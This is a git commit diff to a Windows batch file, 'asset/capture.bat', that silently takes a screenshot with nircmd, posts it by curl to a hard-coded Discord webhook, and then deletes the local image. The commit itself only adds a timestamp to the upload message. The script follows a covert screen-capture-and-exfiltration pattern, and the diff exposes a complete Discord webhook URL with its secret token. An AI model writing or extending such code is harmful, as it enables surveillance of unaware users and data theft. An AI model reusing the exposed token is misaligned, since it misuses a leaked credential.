a2804709495831eed6ed33cc518ad01edc21a98f
DThang200 <thangdao202@gmail.com>
2025-04-06 17:31:22 +0700

    up

--- asset/capture.bat
+++ asset/capture.bat
@@ -12,6 +12,19 @@ for /f "usebackq delims=" %%a in ("%filePath%") do (
 )
 :break
 
+for /f "tokens=1-3 delims=/ " %%a in ("%date%") do (
+    set "day=%%a"
+    set "month=%%b"
+    set "year=%%c"
+)
+
+for /f "tokens=1-3 delims=:" %%a in ("%time%") do (
+    set "hour=%%a"
+    set "minute=%%b"
+    set "second=%%c"
+)
+set "timestamp=%hour%h - %day%/%month%/%year%"
+
 :: URL webhook Discord của bạn
 set WEBHOOK_URL=https://discord.com/api/webhooks/1356349218574565476/TZDYxbBlLTPJ1Sx-fafa4qbecW0xYAJn22F0O6Yvy5KF8k1jQerLnG4nwgZTSVBDmJrF
 set SCREENSHOT_PATH=%~dp0screenshot.png
@@ -21,7 +34,7 @@ nircmd.exe savescreenshot "%SCREENSHOT_PATH%"
 
 :: Gửi ảnh lên webhook bằng curl
 curl -X POST "%WEBHOOK_URL%" -H "Content-Type: multipart/form-data" ^
-    -F "file=@%SCREENSHOT_PATH%" -F "payload_json={\"content\":\"%firstLine%\"}"
+    -F "file=@%SCREENSHOT_PATH%" -F "payload_json={\"content\":\"%firstLine% - %timestamp%\"}"
 
 :: Xóa ảnh sau khi gửi
 del "%SCREENSHOT_PATH%"
